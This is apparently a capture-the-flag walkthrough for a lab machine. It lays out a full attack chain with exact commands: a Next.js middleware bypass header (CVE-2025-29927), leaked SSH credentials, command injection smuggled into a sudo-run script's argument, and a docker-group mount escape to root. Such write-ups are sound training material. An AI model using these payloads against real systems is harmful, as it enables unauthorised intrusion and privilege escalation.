step-by-step roadmap:

1. Enumerate — nmap finds ports 22 (SSH), 80 (nginx proxying Next.js 14.2.24). gobuster finds /login and /admin (307 → login). All JS assets return 404.
2. Bypass middleware — Send x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware to /admin → 200 OK (CVE-2025-29927).
3. Find API — Brute-force internal paths with the bypass header. /api/internal/config returns JSON with SSH creds dev:S3cur3D3v#2024!.
4. SSH in → user.txt — sshpass -p 'S3cur3D3v#2024!' ssh dev@192.168.163.130 cat ~/user.txt
5. Check sudo — sudo -l shows dev can run /opt/tools/sysreport.py as sysadmin (NOPASSWD).
6. Command injection — sysreport.py does os.system(f"cat /var/reports/{report_type}.txt"). Inject with # to comment out .txt.
7. Docker escape → root.txt — sysadmin is in docker group. Payload: sudo -u sysadmin /usr/bin/python3 /opt/tools/sysreport.py 'a;docker run -v /:/mnt/root alpine:latest cat /mnt/root/root/root.txt #'
if you want to Qualification this challenge what it will be like SQLI to RCE ect ...

Middleware Bypass → Credential Leak → SSH Access → Command Injection → Docker Escape

Breaking it down:

- CVE-2025-29927 (Next.js middleware bypass) to access /admin
- IDOR / Unauthenticated API (/api/internal/config) leaks SSH credentials
- SSH as dev for initial foothold → user.txt
- Sudo misconfig + Cmd injection (os.system() in sysreport.py) to run code as sysadmin
- Docker group abuse (container escape) to read /root/root.txt

Full chain: CVE Bypass → Info Leak → SSH → Cmd Injection → Docker Escape
